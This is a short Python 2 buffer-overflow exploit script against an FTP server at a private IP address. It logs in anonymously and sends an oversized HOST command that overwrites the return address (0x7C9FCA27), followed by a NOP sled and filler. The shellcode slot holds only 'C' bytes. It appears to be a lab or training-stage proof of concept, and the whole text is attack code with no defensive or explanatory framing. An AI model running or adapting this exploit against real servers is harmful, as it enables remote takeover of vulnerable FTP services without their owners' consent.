#!/usr/bin/python



import socket
import os
import sys

#creat an array of buffers, while incrementing them.

buffer = "A" * 246 + "\x27\xca\x9f\x7c" + "\x90" * 8 +  "C" * (500-246-8-4)

#EIP Offset = 7C9FCA27

print "[+] Sending Buffer."
s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect=s.connect(('192.168.0.156',21))
s.recv(1024)
s.send('USER anonymous\r\n')
s.recv(1024)
s.send('PASS anonymous\r\n')
s.recv(1024)
s.send('HOST ' + buffer + '\r\n')
s.send('QUIT\r\n')
s.close()
print "[+] Exploit Completed."
